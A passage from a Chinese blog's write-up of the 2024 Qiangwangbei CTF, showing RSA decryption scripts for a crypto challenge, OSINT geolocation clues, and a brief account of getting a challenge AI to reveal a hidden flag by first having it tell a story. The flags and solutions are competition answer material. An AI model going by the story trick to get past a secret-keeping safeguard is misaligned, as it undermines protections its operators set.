class="line">9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br></pre></td></tr></table></figure>
<p>得到，p，q 直接解出第二部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"># kq, s, t = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line">c2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(65537, (p-1)*(q-1))</span><br><span class="line">m = pow(c2,d,n)</span><br><span class="line">flag2 = long_to_bytes(m)</span><br><span class="line">print(q*p)</span><br><span class="line">print(flag2)</span><br><span class="line"># b&#x27;s0lve_the_@pb&#x27;</span><br></pre></td></tr></table></figure>
<p>第三部分：</p>
<p>发现这里可以直接用第二部分的 p， q</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">from gmpy2 import gmpy2</span><br><span class="line"># # kq, s, t = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549 0 1</span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">n, e = (73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class="line">c2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(65537, (p-1)*(q-1))</span><br><span class="line">m = pow(c2,d,n)</span><br><span class="line">flag2 = long_to_bytes(m)</span><br><span class="line">print(q*p)</span><br><span class="line">print(flag2)</span><br><span class="line"># b&#x27;s0lve_the_@pb&#x27;</span><br><span class="line"></span><br><span class="line">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class="line">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class="line">c3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br><span class="line"></span><br><span class="line">n3,e3 = (94789409892878223843496496113047481402435455468813255092840207010463661854593919772268992045955100688692872116996741724352837555794276141314552518390800907711192442516993891316013640874154318671978150702691578926912235318405120588096104222702992868492960182477857526176600665556671704106974346372234964363581, 65537)</span><br><span class="line">c3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br><span class="line">m3 = pow(c3,d,n)</span><br><span class="line">flag3= long_to_bytes(m3)</span><br><span class="line">print(flag3)</span><br><span class="line"># b&#x27;q_prob1em!!&#125;&#x27;</span><br></pre></td></tr></table></figure>
<h1 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> Misc：</h1>
<h2 id="givemesecret"><a class="markdownIt-Anchor" href="#givemesecret">#</a> givemesecret：</h2>
<p>​		ai 题，虽然不懂原理，但队友出了，他的方法是先让 ai 编一个故事，是否和 flag 有关我没问他，之后让 ai 显示 flag 即可</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/2188fc8e167d4abc8b142f462c81ff30.png#pic_center" alt="在这里插入图片描述"></p>
<h2 id="master-of-osint"><a class="markdownIt-Anchor" href="#master-of-osint">#</a> Master of OSINT：</h2>
<p>1. 远处有海，有山，有草，空旷，北方，环海或者环湖公路，青海湖，根据位置去找</p>
<p>2. 百安居去找</p>
<p>3. 四川省机场集团航空地面服务有限公司</p>
<p>4.IKEA 宜家家居附近</p>
<p>5. 重庆</p>
<p>6.H 形大厦</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/a7a84a502b8243e7b5064e67ea497ef4.jpeg#pic_center" alt="在这里插入图片描述"></p>
<p>7. 左侧是船，右侧觉华塔，橘子洲游客中心位置</p>
<p>8. 一个跨海大桥，右侧车道 “长江”</p>
<p>9. 武汉天兴洲长江大桥中间</p>
<p><img data-src="https://i-blog.csdnimg.cn/direct/a7aeeaf030df4557ae759a32c4def541.jpeg#pic_center" alt="在这里插入图片描述"></p>
<p>10. 宏泰百货，然后杭州和深圳都试试，确定为杭州</p>
<h2 id="签到"><a class="markdownIt-Anchor" href="#签到">#</a> 签到：</h2>
<p>​		flag 再内容里，直接交。</p>
<h2 id="问卷调查"><a class="markdownIt-Anchor" href="#问卷调查">#</a> 问卷调查：</h2>
<p>​		填写问卷就有 flag。</p>

      <div class="tags">
          <a href="/tags/Game/" rel="tag"><i class="ic i-tag"></i> Game</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2024-11-03 19:32:14" itemprop="dateModified" datetime="2024-11-03T19:32:14+08:00">2024-11-03</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="g01den 支付宝">
        <p>支付宝</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="g01den 贝宝">
        <p>贝宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://blog.g01den.top/posts/666fe8df.html" title="【2024】强网杯">http://blog.g01den.top/posts/666fe8df.html</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/posts/c2860616.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;10&#x2F;31&#x2F;PowHXa4FhLpSzyu.jpg" title="网鼎杯2024青龙组官方资格赛wp">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> CTFer的比赛之路</span>
  <h3>网鼎杯2024青龙组官方资格赛wp</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/posts/540e5c20.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;11&#x2F;05&#x2F;hQ5dotLSvj7m96u.jpg" title="Pwn学习笔记（10）--UAF">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
  <h3>Pwn学习笔记（10）--UAF</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> web：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pyblockly"><span class="toc-number">1.1.</span> <span class="toc-text"> PyBlockly：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xiaohuanxiong"><span class="toc-number">1.2.</span> <span class="toc-text"> xiaohuanxiong：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proxy"><span class="toc-number">1.3.</span> <span class="toc-text"> proxy：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#snake"><span class="toc-number">1.4.</span> <span class="toc-text"> snake：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#platform%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.5.</span> <span class="toc-text"> platform（复现）：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text"> Crypto：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eazyrsa"><span class="toc-number">2.1.</span> <span class="toc-text"> eazyrsa：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apbq"><span class="toc-number">2.2.</span> <span class="toc-text"> apbq：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">3.</span> <span class="toc-text"> Misc：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#givemesecret"><span class="toc-number">3.1.</span> <span class="toc-text"> givemesecret：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#master-of-osint"><span class="toc-number">3.2.</span> <span class="toc-text"> Master of OSINT：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">3.3.</span> <span class="toc-text"> 签到：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E5%8D%B7%E8%B0%83%E6%9F%A5"><span class="toc-number">3.4.</span> <span class="toc-text"> 问卷调查：</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li><a href="/posts/fe4eec6d.html" rel="bookmark" title="【2024】高校网络安全管理运维赛">【2024】高校网络安全管理运维赛</a></li><li><a href="/posts/955175a5.html" rel="bookmark" title="【2024】H&NCTF">【2024】H&NCTF</a></li><li><a href="/posts/9dd9bec.html" rel="bookmark" title="Ciscn2024">Ciscn2024</a></li><li><a href="/posts/a929fb97.html" rel="bookmark" title="【2023】LitCTF">【2023】LitCTF</a></li><li><a href="/posts/4bf5e0ee.html" rel="bookmark" title="【2024】LitCTF">【2024】LitCTF</a></li><li><a href="/posts/c2860616.html" rel="bookmark" title="网鼎杯2024青龙组官方资格赛wp">网鼎杯2024青龙组官方资格赛wp</a></li><li class="active"><a href="/posts/666fe8df.html" rel="bookmark" title="【2024】强网杯">【2024】强网杯</a></li><li><a href="/posts/de34fe7b.html" rel="bookmark" title="【2024】HECTF-个人整理向">【2024】HECTF-个人整理向</a></li><li><a href="/posts/a4378bd0.html" rel="bookmark" title="【2025】LitCTF">【2025】LitCTF</a></li><li><a href="/posts/215f7d8b.html" rel="bookmark" title="【2025】HECTF">【2025】HECTF</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="g01den"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">g01den</p>
  <div class="description" itemprop="description">golden的部落阁</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">50</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">10</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">8</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/posts/c2860616.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/posts/540e5c20.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
</div>

    <span><a href="/posts/de34fe7b.html" title="【2024】HECTF-个人整理向">【2024】HECTF-个人整理向</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/53e2b2e1.html" title="ctfshow-命令执行">ctfshow-命令执行</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
</div>

    <span><a href="/posts/9dd9bec.html" title="Ciscn2024">Ciscn2024</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Major/" title="分类于 考研专业课">考研专业课</a>
<i class="ic i-angle-right"></i>
<a href="/categories/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a>
</div>

    <span><a href="/posts/2c763aa6.html" title="数据结构-3、栈、队列和数组">数据结构-3、栈、队列和数组</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
</div>

    <span><a href="/posts/27a95d1a.html" title="hexo部署服务器">hexo部署服务器</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/a698ff8.html" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
</div>

    <span><a href="/posts/ff5b88d5.html" title="python原型链污染">python原型链污染</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
</div>

    <span><a href="/posts/c2860616.html" title="网鼎杯2024青龙组官方资格赛wp">网鼎杯2024青龙组官方资格赛wp</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/9b0d93f7.html" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
</div>

    <span><a href="/posts/efb4c08.html" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
  </div>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: 'posts/666fe8df.html',
    favicon: {
      show: "（●´3｀●）やれやれだぜ",
      hide: "(´Д｀)大変だ！"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
</html>
